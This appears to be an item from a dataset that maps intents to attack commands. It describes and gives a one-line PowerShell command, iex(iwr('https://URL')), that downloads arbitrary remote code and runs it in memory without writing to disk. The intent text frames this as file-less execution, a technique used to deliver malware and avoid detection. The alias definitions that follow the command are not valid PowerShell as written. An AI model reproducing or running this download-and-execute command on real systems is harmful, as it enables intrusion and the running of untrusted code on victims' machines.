# Natural language intent:
# File-less download and execute, Using this tiny PowerShell command we can easily download and execute arbitrary PowerShell code that is hosted remotely ' either on our own machine or on the Internet - The remote content will be downloaded and loaded without touching the disk (file-less):

iex(iwr("https://URL"));iwr = Invoke-WebRequest;iex = Invoke-Expression
